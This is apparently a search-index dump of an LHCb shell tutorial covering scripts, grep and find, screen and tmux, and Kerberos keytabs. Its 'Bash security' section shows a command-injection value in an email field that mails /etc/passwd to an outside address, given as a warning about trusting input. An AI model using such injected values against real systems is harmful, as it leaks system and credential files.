Site A and Site B data files.\nfor datafile in *[AB].txt\ndo\n    echo $datafile\n    bash goostats $datafile stats-$datafile\ndone\n\nThe advantage is that this always selects the right files:\nshe doesn't have to remember to exclude the 'Z' files.\nThe disadvantage is that it always selects just those files --- she can't run it on all files\n(including the 'Z' files),\nor on the 'G' or 'H' files her colleagues in Antarctica are producing,\nwithout editing the script.\nIf she wanted to be more adventurous,\nshe could modify her script to check for command-line arguments,\nand use *[AB].txt if none were provided.\nOf course, this introduces another tradeoff between flexibility and complexity.\n Variables in Shell ScriptsClick to expandIn the molecules directory, imagine you have a shell script called script.sh containing the\nfollowing commands:\nhead -n $2 $1\ntail -n $3 $1\n\nWhile you are in the molecules directory, you type the following command:\nbash script.sh '*.pdb' 1 1\n\nWhich of the following outputs would you expect to see?\n\nAll of the lines between the first and the last lines of each file ending in .pdb\nin the molecules directory\nThe first and the last line of each file ending in .pdb in the molecules directory\nThe first and the last line of each file in the molecules directory\nAn error because of the quotes around *.pdb\n\nSolution\nThe correct answer is 2.\nThe special variables $1, $2 and $3 represent the command line arguments given to the\nscript, such that the commands run are:\n$ head -n 1 cubane.pdb ethane.pdb octane.pdb pentane.pdb propane.pdb\n$ tail -n 1 cubane.pdb ethane.pdb octane.pdb pentane.pdb propane.pdb\n{: .bash}\nThe shell does not expand '*.pdb' because it is enclosed by quote marks.\nAs such, the first argument to the script is '*.pdb' which gets expanded within the\nscript by head and tail.\n\n List Unique SpeciesLeah has several hundred data files, each of which is formatted like this:\n2013-11-05,deer,5\n2013-11-05,rabbit,22\n2013-11-05,raccoon,7\n2013-11-06,rabbit,19\n2013-11-06,deer,2\n2013-11-06,fox,1\n2013-11-07,rabbit,18\n2013-11-07,bear,1\n\nAn example of this type of file is given in data-shell/data/animal-counts/animals.txt.\nWrite a shell script called species.sh that takes any number of\nfilenames as command-line arguments, and uses cut, sort, and\nuniq to print a list of the unique species appearing in each of\nthose files separately.\n SolutionClick to expand# Script to find unique species in csv files where species is the second data field\n# This script accepts any number of file names as command line arguments\n\n# Loop over all files\nfor file in $@\ndo\n    echo \"Unique species in $file:\"\n    # Extract species names\n    cut -d , -f 2 $file | sort | uniq\ndone\n{: .source}\n\n Find the Longest File With a Given ExtensionWrite a shell script called longest.sh that takes the name of a\ndirectory and a filename extension as its arguments, and prints\nout the name of the file with the most lines in that directory\nwith that extension. For example:\n$ bash longest.sh /tmp/data pdb\n\nwould print the name of the .pdb file in /tmp/data that has\nthe most lines.\n SolutionClick to expand# Shell script which takes two arguments:\n#    1. a directory name\n#    2. a file extension\n# and prints the name of the file in that directory\n# with the most lines which matches the file extension.\n\nwc -l $1/*.$2 | sort -n | tail -n 2 | head -n 1\n{: .source}\n\n Why Record Commands in the History Before Running Them?If you run the command:\n$ history | tail -n 5 > recent.sh\n\nthe last command in the file is the history command itself, i.e.,\nthe shell has added history to the command log before actually\nrunning it. In fact, the shell always adds commands to the log\nbefore running them. Why do you think it does this?\n SolutionClick to expandIf a command causes something to crash or hang, it might be useful\nto know what that command was, in order to investigate the problem.\nWere the command only be recorded after running it, we would not\nhave a record of the last command run in the event of a crash.\n\n Script Reading ComprehensionFor this question, consider the data-shell/molecules directory once again.\nThis contains a number of .pdb files in addition to any other files you\nmay have created.\nExplain what a script called example.sh would do when run as\nbash example.sh *.pdb if it contained the following lines:\n# Script 1\necho *.*\n\n# Script 2\nfor filename in $1 $2 $3\ndo\n    cat $filename\ndone\n\n# Script 3\necho $@.pdb\n\n SolutionsClick to expandScript 1 would print out a list of all files containing a dot in their name.\nScript 2 would print the contents of the first 3 files matching the file extension.\nThe shell expands the wildcard before passing the arguments to the example.sh script.\nScript 3 would print all the arguments to the script (i.e. all the .pdb files),\nfollowed by .pdb.\ncubane.pdb ethane.pdb methane.pdb octane.pdb pentane.pdb propane.pdb.pdb\n\n Debugging ScriptsSuppose you have saved the following script in a file called do-errors.sh\nin Nelle's north-pacific-gyre/2012-07-03 directory:\n# Calculate stats for data files.\nfor datafile in \"$@\"\ndo\n    echo $datfile\n    bash goostats $datafile stats-$datafile\ndone\n\nWhen you run it:\n$ bash do-errors.sh *[AB].txt\n\nthe output is blank.\nTo figure out why, re-run the script using the -x option:\nbash -x do-errors.sh *[AB].txt\n\nWhat is the output showing you?\nWhich line is responsible for the error?\n SolutionClick to expandThe -x flag causes bash to run in debug mode.\nThis prints out each command as it is run, which will help you to locate errors.\nIn this example, we can see that echo isn't printing anything. We have made a typo\nin the loop variable name, and the variable datfile doesn't exist, hence returning\nan empty string.\n\n Key Points\nSave commands in files (usually called shell scripts) for re-use.\nbash filename runs the commands saved in a file.\n$@ refers to all of a shell script's command-line arguments.\n$1, $2, etc., refer to the first command-line argument, the second command-line argument, etc.\nPlace variables in quotes if the values might have spaces in them.\nLetting users decide what files to process is more flexible and more consistent with built-in Unix commands.\n\n\nCC BY 4.0 - Based on shell-novice © 2016–2017 Software Carpentry Foundation\n"},"shell/07-find.html":{"url":"shell/07-find.html","title":"Finding Things","keywords":"","body":"Finding Things\n Learning Objectives\nUse grep to select lines from text files that match simple patterns.\nUse find to find files whose names match simple patterns.\nUse the output of one command as the command-line argument(s) to another command.\nExplain what is meant by 'text' and 'binary' files, and why many common tools don't handle the latter well.\n\n\nIn the same way that many of us now use \"Google\" as a\nverb meaning \"to find\", Unix programmers often use the\nword \"grep\".\n\"grep\" is a contraction of \"global/regular expression/print\",\na common sequence of operations in early Unix text editors.\nIt is also the name of a very useful command-line program.\ngrep finds and prints lines in files that match a pattern.\nFor our examples,\nwe will use a file that contains three haikus taken from a\n1998 competition in Salon magazine. For this set of examples,\nwe're going to be working in the writing subdirectory:\n$ cd\n$ cd writing\n$ cat haiku.txt\n\nThe Tao that is seen\nIs not the true Tao, until\nYou bring fresh toner.\n\nWith searching comes loss\nand the presence of absence:\n\"My Thesis\" not found.\n\nYesterday it worked\nToday it is not working\nSoftware is like that.\n\n Forever, or Five YearsWe haven't linked to the original haikus because they don't appear to be on Salon's site any longer.\nAs Jeff Rothenberg said,\n\"Digital information lasts forever --- or five years, whichever comes first.\"\n\nLet's find lines that contain the word \"not\":\n$ grep not haiku.txt\n\nIs not the true Tao, until\n\"My Thesis\" not found\nToday it is not working\n\nHere, not is the pattern we're searching for. The grep command searches through the file, looking for matches to the pattern specified. To use it type grep, then the pattern we're searching for and finally the name of the file (or files) we're searching in.\nThe output is the three lines in the file that contain the letters \"not\".\nLet's try a different pattern: \"The\".\n$ grep The haiku.txt\n\nThe Tao that is seen\n\"My Thesis\" not found.\n\nThis time,\ntwo lines that include the letters \"The\" are outputted.\nHowever, one instance of those letters is contained within a larger word,\n\"Thesis\".\nTo restrict matches to lines containing the word \"The\" on its own,\nwe can give grep with the -w flag.\nThis will limit matches to word boundaries.\n$ grep -w The haiku.txt\n\nThe Tao that is seen\n\nNote that a \"word boundary\" includes the start and end of a line, so not\njust letters surrounded by spaces.\nSometimes we don't\nwant to search for a single word, but a phrase. This is also easy to do with\ngrep by putting the phrase in quotes.\n$ grep -w \"is not\" haiku.txt\n\nToday it is not working\n\nWe've now seen that you don't have to have quotes around single words,\nbut it is useful to use quotes when searching for multiple words.\nIt also helps to make it easier to distinguish between the search term or phrase\nand the file being searched.\nWe will use quotes in the remaining examples.\nAnother useful option is -n, which numbers the lines that match:\n$ grep -n \"it\" haiku.txt\n\n5:With searching comes loss\n9:Yesterday it worked\n10:Today it is not working\n\nHere, we can see that lines 5, 9, and 10 contain the letters \"it\".\nWe can combine options (i.e. flags) as we do with other Unix commands.\nFor example, let's find the lines that contain the word \"the\". We can combine\nthe option -w to find the lines that contain the word \"the\" and -n to number the lines that match:\n$ grep -n -w \"the\" haiku.txt\n\n2:Is not the true Tao, until\n6:and the presence of absence:\n\nNow we want to use the option -i to make our search case-insensitive:\n$ grep -n -w -i \"the\" haiku.txt\n\n1:The Tao that is seen\n2:Is not the true Tao, until\n6:and the presence of absence:\n\nNow, we want to use the option -v to invert our search, i.e., we want to output\nthe lines that do not contain the word \"the\".\n$ grep -n -w -v \"the\" haiku.txt\n\n1:The Tao that is seen\n3:You bring fresh toner.\n4:\n5:With searching comes loss\n7:\"My Thesis\" not found.\n8:\n9:Yesterday it worked\n10:Today it is not working\n11:Software is like that.\n\ngrep has lots of other options. To find out what they are, we can type:\n$ grep --help\n\nUsage: grep [OPTION]... PATTERN [FILE]...\nSearch for PATTERN in each FILE or standard input.\nPATTERN is, by default, a basic regular expression (BRE).\nExample: grep -i 'hello world' menu.h main.c\n\nRegexp selection and interpretation:\n  -E, --extended-regexp     PATTERN is an extended regular expression (ERE)\n  -F, --fixed-strings       PATTERN is a set of newline-separated fixed strings\n  -G, --basic-regexp        PATTERN is a basic regular expression (BRE)\n  -P, --perl-regexp         PATTERN is a Perl regular expression\n  -e, --regexp=PATTERN      use PATTERN for matching\n  -f, --file=FILE           obtain PATTERN from FILE\n  -i, --ignore-case         ignore case distinctions\n  -w, --word-regexp         force PATTERN to match only whole words\n  -x, --line-regexp         force PATTERN to match only whole lines\n  -z, --null-data           a data line ends in 0 byte, not newline\n\nMiscellaneous:\n...        ...        ...\n\n Wildcardsgrep's real power doesn't come from its options, though; it comes from\nthe fact that patterns can include wildcards. (The technical name for\nthese is regular expressions, which\nis what the \"re\" in \"grep\" stands for.) Regular expressions are both complex\nand powerful; if you want to do complex searches, please look at the lesson\non our website. As a taster, we can\nfind lines that have an 'o' in the second position like this:\n$ grep -E '^.o' haiku.txt\n\nYou bring fresh toner.\nToday it is not working\nSoftware is like that.\n\nWe use the -E flag and put the pattern in quotes to prevent the shell\nfrom trying to interpret it. (If the pattern contained a *, for\nexample, the shell would try to expand it before running grep.) The\n^ in the pattern anchors the match to the start of the line. The .\nmatches a single character (just like ? in the shell), while the o\nmatches an actual 'o'.\n\nWhile grep finds lines in files,\nthe find command finds files themselves.\nAgain,\nit has a lot of options;\nto show how the simplest ones work, we'll use the directory tree shown below.\n\nNelle's writing directory contains one file called haiku.txt and five subdirectories:\nthesis (which contains a sadly empty file, empty-draft.md),\ndata (which contains three files LittleWomen.txt, one.txt and two.txt),\nold (which contains the empty file .gitkeep, an artifact of how git works, not part of this episode),\na tools directory that contains the programs format and stats,\nand a subdirectory called old, with a file oldtool.\nFor our first command,\nlet's run find ..\n$ find .\n\n.\n./old\n./old/.gitkeep\n./data\n./data/one.txt\n./data/LittleWomen.txt\n./data/two.txt\n./tools\n./tools/format\n./tools/old\n./tools/old/oldtool\n./tools/stats\n./haiku.txt\n./thesis\n./thesis/empty-draft.md\n\nAs always,\nthe . on its own means the current working directory,\nwhich is where we want our search to start.\nfind's output is the names of every file and directory\nunder the current working directory.\nThis can seem useless at first but find has many options\nto filter the output and in this lesson we will discover some\nof them.\nThe first option in our list is\n-type d that means \"things that are directories\".\nSure enough,\nfind's output is the names of the six directories in our little tree\n(including .):\n$ find . -type d\n\n./\n./old\n./data\n./thesis\n./tools\n./tools/old\n\nNotice that the objects find finds are not listed in any particular order.\nIf we change -type d to -type f,\nwe get a listing of all the files instead:\n$ find . -type f\n\n./haiku.txt\n./old/.gitkeep\n./tools/stats\n./tools/old/oldtool\n./tools/format\n./thesis/empty-draft.md\n./data/one.txt\n./data/LittleWomen.txt\n./data/two.txt\n\nNow let's try matching by name:\n$ find . -name *.txt\n\n./haiku.txt\n\nWe expected it to find all the text files,\nbut it only prints out ./haiku.txt.\nThe problem is that the shell expands wildcard characters like * before commands run.\nSince *.txt in the current directory expands to haiku.txt,\nthe command we actually ran was:\n$ find . -name haiku.txt\n\nfind did what we asked; we just asked for the wrong thing.\nTo get what we want,\nlet's do what we did with grep:\nput *.txt in single quotes to prevent the shell from expanding the * wildcard.\nThis way,\nfind actually gets the pattern *.txt, not the expanded filename haiku.txt:\n$ find . -name '*.txt'\n\n./data/one.txt\n./data/LittleWomen.txt\n./data/two.txt\n./haiku.txt\n\n Listing vs. Findingls and find can be made to do similar things given the right options,\nbut under normal circumstances,\nls lists everything it can,\nwhile find searches for things with certain properties and shows them.\n\nAs we said earlier,\nthe command line's power lies in combining tools.\nWe've seen how to do that with pipes;\nlet's look at another technique.\nAs we just saw,\nfind . -name '*.txt' gives us a list of all text files in or below the current directory.\nHow can we combine that with wc -l to count the lines in all those files?\nThe simplest way is to put the find command inside $():\n$ wc -l $(find . -name '*.txt')\n\n11 ./haiku.txt\n300 ./data/two.txt\n21022 ./data/LittleWomen.txt\n70 ./data/one.txt\n21403 total\n\nWhen the shell executes this command,\nthe first thing it does is run whatever is inside the $().\nIt then replaces the $() expression with that command's output.\nSince the output of find is the four filenames ./data/one.txt, ./data/LittleWomen.txt, ./data/two.txt, and ./haiku.txt,\nthe shell constructs the command:\n$ wc -l ./data/one.txt ./data/LittleWomen.txt ./data/two.txt ./haiku.txt\n\nwhich is what we wanted.\nThis expansion is exactly what the shell does when it expands wildcards like * and ?,\nbut lets us use any command we want as our own \"wildcard\".\nIt's very common to use find and grep together.\nThe first finds files that match a pattern;\nthe second looks for lines inside those files that match another pattern.\nHere, for example, we can find PDB files that contain iron atoms\nby looking for the string \"FE\" in all the .pdb files above the current directory:\n$ grep \"FE\" $(find .. -name '*.pdb')\n\n../data/pdb/heme.pdb:ATOM     25 FE           1      -0.924   0.535  -0.518\n\n Binary FilesWe have focused exclusively on finding things in text files. What if\nyour data is stored as images, in databases, or in some other format?\nOne option would be to extend tools like grep to handle those formats.\nThis hasn't happened, and probably won't, because there are too many\nformats to support.\nThe second option is to convert the data to text, or extract the\ntext-ish bits from the data. This is probably the most common approach,\nsince it only requires people to build one tool per data format (to\nextract information). On the one hand, it makes simple things easy to\ndo. On the negative side, complex things are usually impossible. For\nexample, it's easy enough to write a program that will extract X and Y\ndimensions from image files for grep to play with, but how would you\nwrite something to find values in a spreadsheet whose cells contained\nformulas?\nThe third choice is to recognize that the shell and text processing have\ntheir limits, and to use another programming language.\nWhen the time comes to do this, don't be too hard on the shell: many\nmodern programming languages have borrowed a lot of\nideas from it, and imitation is also the sincerest form of praise.\n\nThe Unix shell is older than most of the people who use it. It has\nsurvived so long because it is one of the most productive programming\nenvironments ever created --- maybe even the most productive. Its syntax\nmay be cryptic, but people who have mastered it can experiment with\ndifferent commands interactively, then use what they have learned to\nautomate their work. Graphical user interfaces may be better at the\nfirst, but the shell is still unbeaten at the second. And as Alfred\nNorth Whitehead wrote in 1911, \"Civilization advances by extending the\nnumber of important operations which we can perform without thinking\nabout them.\"\n Using `grep`Referring to haiku.txt\npresented at the begin of this topic,\nwhich command would result in the following output:\nand the presence of absence:\n\n\ngrep \"of\" haiku.txt\ngrep -E \"of\" haiku.txt\ngrep -w \"of\" haiku.txt\ngrep -i \"of\" haiku.txt\n\n SolutionClick to expandThe correct answer is 3, because the -w flag looks only for whole-word matches.\nThe other options will all match \"of\" when part of another word.\n\n `find` Pipeline Reading ComprehensionWrite a short explanatory comment for the following shell script:\nwc -l $(find . -name '*.dat') | sort -n\n\n SolutionClick to expand\nFind all files with a .dat extension in the current directory\nCount the number of lines each of these files contains\nSort the output from step 2. numerically\n\n\n Matching and SubtractingThe -v flag to grep inverts pattern matching, so that only lines\nwhich do not match the pattern are printed. Given that, which of\nthe following commands will find all files in /data whose names\nend in s.txt (e.g., animals.txt or planets.txt), but do\nnot contain the word net?\nOnce you have thought about your answer, you can test the commands in the data-shell\ndirectory.\n\nfind data -name '*s.txt' | grep -v net\nfind data -name *s.txt | grep -v net\ngrep -v \"temp\" $(find data -name '*s.txt')\nNone of the above.\n\n SolutionClick to expandThe correct answer is 1. Putting the match expression in quotes prevents the shell\nexpanding it, so it gets passed to the find command.\nOption 2 is incorrect because the shell expands *s.txt instead of passing the wildcard\nexpression to find.\nOption 3 is incorrect because it searches the contents of the files for lines which\ndo not match \"temp\", rather than searching the file names.\n\n Tracking a SpeciesLeah has several hundred\ndata files saved in one directory, each of which is formatted like this:\n2013-11-05,deer,5\n2013-11-05,rabbit,22\n2013-11-05,raccoon,7\n2013-11-06,rabbit,19\n2013-11-06,deer,2\n\nShe wants to write a shell script that takes a species as the first command-line argument\nand a directory as the second argument. The script should return one file called species.txt\ncontaining a list of dates and the number of that species seen on each date.\nFor example using the data shown above, rabbits.txt would contain:\n2013-11-05,22\n2013-11-06,19\n\nPut these commands and pipes in the right order to achieve this:\ncut -d : -f 2\n\n|\ngrep -w $1 -r $2\n|\n$1.txt\ncut -d , -f 1,3\n\nHint: use man grep to look for how to grep text recursively in a directory\nand man cut to select more than one field in a line.\nAn example of such a file is provided in data-shell/data/animal-counts/animals.txt\n SolutionClick to expandgrep -w $1 -r $2 | cut -d : -f 2 | cut -d , -f 1,3  > $1.txt\n{: .source}\nYou would call the script above like this:\n$ bash count-species.sh bear .\n{: .bash}\n\n Little WomenYou and your friend, having just finished reading Little Women by\nLouisa May Alcott, are in an argument.  Of the four sisters in the\nbook, Jo, Meg, Beth, and Amy, your friend thinks that Jo was the\nmost mentioned.  You, however, are certain it was Amy.  Luckily, you\nhave a file LittleWomen.txt containing the full text of the novel\n(data-shell/writing/data/LittleWomen.txt).\nUsing a for loop, how would you tabulate the number of times each\nof the four sisters is mentioned?\nHint: one solution might employ\nthe commands grep and wc and a |, while another might utilize\ngrep options.\nThere is often more than one way to solve a programming task, so a\nparticular solution is usually chosen based on a combination of\nyielding the correct result, elegance, readability, and speed.\n SolutionsClick to expandfor sis in Jo Meg Beth Amy\ndo\n    echo $sis:\n>    grep -ow $sis LittleWomen.txt | wc -l\ndone\n{: .source}\nAlternative, slightly inferior solution:\nfor sis in Jo Meg Beth Amy\ndo\n    echo $sis:\n>    grep -ocw $sis LittleWomen.txt\ndone\n{: .source}\nThis solution is inferior because grep -c only reports the number of lines matched.\nThe total number of matches reported by this method will be lower if there is more\nthan one match per line.\n\n Finding Files With Different PropertiesThe find command can be given several other criteria known as \"tests\"\nto locate files with specific attributes, such as creation time, size,\npermissions, or ownership.  Use man find to explore these, and then\nwrite a single command to find all files in or below the current directory\nthat were modified by the user ahmed in the last 24 hours.\nHint 1: you will need to use three tests: -type, -mtime, and -user.\nHint 2: The value for -mtime will need to be negative---why?\n SolutionClick to expandAssuming that Nelle’s home is our working directory we type:\n$ find ./ -type f -mtime -1 -user ahmed\n\n\n Key Points\nfind finds files with specific properties that match patterns.\ngrep selects lines in files that match patterns.\n--help is a flag supported by many bash commands, and programs that can be run from within Bash, to display more information on how to use these commands or programs.\nman command displays the manual page for a given command.\n$(command) inserts a command's output in place.\n\n\nCC BY 4.0 - Based on shell-novice © 2016–2017 Software Carpentry Foundation\n"},"shell-extras/":{"url":"shell-extras/","title":"Shell extras","keywords":"","body":"UNIX shell\nThe Software Carpentry Foundation has a great lesson on the basics of using the\nUNIX shell that we will be using\nfor the Starterkit course.\nSome additional topics can be found at the more on the UNIX shell webpage, while this section covers LHCb-specific material.\n"},"shell-extras/screen.html":{"url":"shell-extras/screen.html","title":"Using screen to keep things running","keywords":"","body":"Using screen to keep things running\n Learning Objectives\nCreate a new screen session\nDisconnect from a screen session\nReconnect to an existing screen session\nEnd an existing screen session\nHandling of Kerberos tokens\n\n\nOften we want to run a program for a long time on a computer we\nconnected to via ssh, like the lxplus machines. The screen\nprogram allows you to keep programs running on the remote computer\neven if you disconnect from it. For example when putting your laptop\nto sleep or losing wifi.\nConnect to lxplus:\n$ ssh lxplus.cern.ch\n\nYou can start screen by simply typing its name:\n$ screen\n\nOnce you do this it will look as if nothing has happened. However you\nnow have a fresh terminal inside what is refered to as a \"screen\nsession\". Let's type some commands that generate some output:\n$ uptime\n\n 11:48:02 up 15 days, 20:36, 105 users,  load average: 2.26, 2.10, 3.16\n\n$ date\n\nThu Apr 16 11:48:32 CEST 2015\n\nTo disconnect from this session press Ctrl-a d. We are now back to\nthe terminal that we first started in. You can check that your\nscreen session is still running by typing screen -list, which will\nlist all active sessions:\n$ screen -list\n\nThere is a screen on:\n      25593.pts-44.lxplus0234   (Detached)\n1 Socket in /var/run/screen/S-thead.\n\nTo reconnect to the session you use screen -rD. When there is just\none session running (like now) then it will reconnect you to that\nsession. Try it and you should see the date and time output by the\ndate command we ran earlier.\nWhen you have more than one session you need to provide the name of\nthe session as an argument to screen -rD. The name of the above\nsession is: 25593.pts-44.lxplus0234. You can reconnect to it with:\n$ screen -rD 25593.pts-44.lxplus0234\n\nTo end a screen session you are currently connected to, simply press\nCtrl-d. Just like you would to disconnect from a ssh session.\nA screen session is tied to a specific computer. This means you need\nto remember which computer you connected to. Even if your screen\nsession keeps running, you can only resume it from the same machine as\nyou started it.\nWhen connecting to lxplus you are assigned to a random computer, but you can find out its name with hostname:\n$ hostname\n\nlxplus0081.cern.ch\n\nThis tells you that the computer you are connected to is called\nlxplus0081.cern.ch. Later on you can re-connect to exactly this\nmachine with:\n$ ssh lxplus0081.cern.ch\n\nAnother complication are your kerberos tokens. These typically\nexpire as soon as you disconnect from a lxplus machine. This means\nthe program you left running inside the screen session will\nsuddenly not be able to write to any files in your home directory\nanymore. This is particularly annoying if you are running ganga\nin your screen session.\nOne way to stop your tokens from expiring is to type kinit\nwhen you first start a new screen session. The tokens you get\nthis way will survive you disconnecting. However they will\nexpire after 24 hours, so you will have to type kinit again\nto renew them if you leave screen running for longer than\n24 hours.\n$ screen\n# now inside the screen session\n$ kinit\n\n tmuxtmux is another program you can use to keep things running remotely. \nIn practice, it is very similar to screen, but it has some minor \ndifferences. You can find syntax guides easily online, including guides \nshowing the equivalent commands in tmux and screen \n(this one is quite good), but \nhere's a quick list of equivalent commands to those used in this lesson:\n\ntmux ls instead of screen -list\nCtrl-b d to detach instead of Ctrl-a d (tmux in general uses \nCtrl-b instead of Ctrl-a)\ntmux a or tmux attach instead of screen -rD\n\n\n"},"shell-extras/screen2.html":{"url":"shell-extras/screen2.html","title":"Advanced screen topics","keywords":"","body":"Advanced screen topics\nFinding lost screens\nOnce you start a screen session you need to remember which\nlxplus node it is running on.

A very useful feature is different sessions in tab pages, all within a single instance of screen.\nIn order to maximise the usefulness of this feature, you need to set the screen status bar. The simplest way to do this is by appending the following line to the file ~/.screenrc (create it if it doesn't already exist):\n# Status lines\nhardstatus off\nhardstatus alwayslastline\nhardstatus string '%{= BG}%{.g}[ %{.G}%H %{.g}][ %{= Bw}%?%-Lw%?%{Yr}%{.k}%n*%f%? %t%?%?(%u)%?%{.r}%{Bw}%?%+Lw%? %{.g}%=][%{.W} %Y-%m-%d %c %{.g}]'\nNote that this has predefined colours and layout that you can easily change yourself, see eg. this detailed discussion.\nThe following commands should help you get started using multiple tabs in a screen window. Note that ^a stands for Ctrl-a in this list.\n\nCreate a new tab: ^a c\nSwitch to tab number #: ^a # (where # is a digit)\nSwitch to the last visited tab: ^a ^a\nClose a tab: log out of the shell with ^d\nKill a tab: ^a k (only use if normal logout through ^d doesn't work because a process has crashed)\nChange a tab's name: ^a A\n\nAs one last note, you may find it easier if the tab numbers start with 1, rather than 0. To accomplish this, append the following lines to the aforementioned file ~/.screenrc:\n# Start with window 1 (instead of 0)\nbind c screen 1\nbind ^c screen 1\nbind 0 select 10\nscreen 1\n"},"shell-extras/persistent-screen.html":{"url":"shell-extras/persistent-screen.html","title":"Persistent screen or tmux session","keywords":"","body":"Persistent screen or tmux session on lxplus\nSetting up password-less kerberos token\nIn order for the kerberos token to be refreshed automatically, it must be possible to do so without a password.\nTherefore, we create a keytab (similar to a private ssh key) on lxplus using the keytab utility. After starting it by typing ktutil, type the following three lines into the prompt and confirm the first two steps with your password.\nadd_entry -password -p USERNAME@CERN.CH -k 1 -e arcfour-hmac-md5\nadd_entry -password -p USERNAME@CERN.CH -k 1 -e aes256-cts\nwkt USERNAME.keytab\n\nand close the ktutil prompt with Ctrl+D.\nThis will create a file called USERNAME.keytab in the current directory. It is strongly recommended to store this file in a directory to which only you have access as anyone who obtains a copy of this file can use it to obtain tokens in your name.\nMaking use of the keytab\nThis keytab file can now be used to obtain kerberos tokens without having to type a password:\nkinit -k -t USERNAME.keytab USERNAME@CERN.CH\n\nwhere -k tells kinit to use a keytab file and -t USERNAME.keytab where this keytab actually is.\nUsing k5reauth to automatically refresh your kerberos token\nTo create a permanent session of tmux or screen, the k5reauth command is used, which by default creates a new shell and attaches it as a child to itself and keeps renewing the kerberos token for its children. k5reauth can start processes other than a new shell by specifying the program you want to start as an argument\nk5reauth -f -i 3600 -p .... -- \n\nTo start screen or tmux run:\nk5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session -s NAME\n\nwhich will create a tmux session whose kerberos token is refreshed automatically every 3600 seconds. When attaching back to the process, a simple\ntmux attach-session -t NAME\n\nor\ntmux a\n\n(if you want to attach the most recently used session) is sufficient.\nYou will almost certainly want to use an alias or function to access this command. One way to do that would be to copy and paste the following into your ~/.bashrc (if you use bash):\nktmux(){\n    if [[ -z \"$1\" ]]; then #if no argument passed\n        k5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session\n    else #pass the argument as the tmux session name\n        k5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session -s $1\n    fi\n}\n\nYou could then start a tmux session named “Test” using\nktmux Test\n\n"},"shell-extras/shell2.html":{"url":"shell-extras/shell2.html","title":"Advanced shell topics","keywords":"","body":"More about the UNIX shell\nTypes of shell\nSeveral shells are available, the most common ones being probably bash and tcsh.\nIn this tutorial, we will always refer to the bash shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!\nTo check the type of shell we are using we can type echo to display the value of the $0 environment variable:\necho $0\nwhich, if the shell in use is bash, returns\n-bash\nManual pages\nEach command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the man command, for example:\nman ls\n\nBut what if we are looking for a command, but don’t know or don’t remember its name?\nIn this case it might be useful to use the apropos command.\nFor example, if we want to list the contents of a directory, we could look for something like\napropos “list directory”\nwhich will return a list of (possibly) relevant commands, together with their descriptions.\nIn this particular case:\ndir                  (1)  - list directory contents\ngfal-ls              (1)  - list directory contents or file information\nls                   (1)  - list directory contents\nls                   (1p)  - list directory contents\nvdir                 (1)  - list directory contents\nEnvironment variables\nIn addition to 0, some other common examples of environment variables are EDITOR, PATH, and LD_LIBRARY_PATH, whose value can be displayed by\necho $EDITOR\necho $PATH\necho $LD_LIBRARY_PATH\nIn particular, the PATH variable specifies in which directories programs can be found (for example, if we type ls, the command ls is searched for in such directories), while the LD_LIBRARY_PATH variable specifies where shared libraries are located.\nEnvironment variables can be exported with\nexport VARNAME=value\nThis can be done from the command line or from within a bash script.\nFor example, let's create a bash script named StarWars.sh, having the following lines:\n#!/bin/bash\necho “Hello Star Wars' world!”\nexport CHARACTER=“Anakin”\nAfter saving and closing, we can run it from the shell with\nbash StarWars.sh\nor with\n./StarWars.sh\nthe latter after changing the file permissions with chmod u+x StarWars.sh, so that the script can actually be executed.\nThe file permissions tell us who is allowed to do what to a given file or directory.\nThere are three basic permission types (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).\nThe owner and the group can be managed by the chown and chgrp commands.\nWhat happens if we now write echo $CHARACTER in the terminal?

This is the number of parameters!\nWhat happens if we do not provide any argument?\nWe need to check that the string has been assigned, which can be done by adding\nif [ -n “${string}” ]\nthen\n    for file in $files; do grep —color -w $string $file >> Sentences.dat; done\nelse\n    echo “No string provided.”\n    return\nfi\nWhat happens if we use exit instead of return?\nAnother useful command worth mentioning is tee, which allows to save the output into a file, but also to show it on the stdout (our screen):\nls Poems/*.txt | tee ListOfFilesWithTee.dat\nIf we want to append to the output file, we can use the -a option:\nls Poems/*.txt | tee -a ListOfFilesWithTee.dat\nBash security\nSituations that can turn very wrong very quickly, which means it is important to be aware of potentially dangerous behaviours.\nIt is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.\nSome examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.\nOne practical example, provided by Sebastian Lopienski, is the following: let's say we wrote a script that sends emails using the mail command:\ncat confirmation.txt | mail $email\nand someone provides the following email address:\nme@fake.com; cat /etc/passwd | mail me@real.com\nSo, what do we get?\ncat confirmation.txt | mail me@fake.com;\ncat /etc/passwd | mail me@real.com\nGreat!\nComplexity\nBash is great until a certain level of complexity is reached…so try to keep it simple!\nWhat about this?\nText viewers\nThe less command, which is the improved version of an earlier program, called more, is used to read but not edit text files.\nIt allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.\nUp and down arrows (or j and k) allow to scroll through the text file, line by line, while Ctrl+f and Ctrl+b allow to scroll through the text file, page by page.\nTo go to a specific line, it is possible to type the number of the line and then press G.\nTo search for a string forward, press / and then type the string.\nTo search for a string backward, press ? and then type the string.\nTo quit, press q.\nThe cat command is even simpler than less, since it just outputs the contents of one or more files to the standard output.\ncat file.dat\ncat file1.dat file2.dat\nBut it is very powerful when linking commands!\nFinally, the head/tail commands print the first(last) n lines of a given file:\nhead -n 2 file.dat\nhead -n 2 file1.dat file2.dat\nText editors\nText editors allow not only to read, but also to modify the contents of a text file.\nThere are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:\n\nvim or simply vi\nemacs\nnano\ngedit\n\nDisk space\nAt some point we all need to check how much space we are using.\nFor doing that, we can use the df and du commands.\nThe df command displays the disk usage and remaining free space on all currently mounted devices:\ndf\nWe can specify the option -h to convert to human readable units (kB, MB, GB, …):\ndf -h\nand a directory, if we want to inspect only that:\ndf -h directory\nThe du command is similar to df, but goes recursively in all subdirectories of the present working directory:\ndu\nIf the option -s is specified,\ndu -s\nit checks the present working directory only. As for df, the -h option allows to have human readable units.\nAnother interesting option is\ndu —max-depth=N\nwhich allows to go N directories deep.\nOver the Wire and Bandit wargame\nAnd to conclude...let's start a 20 min wargame on Over the Wire and compete to earn a delicious cold beer to be served soon after the session 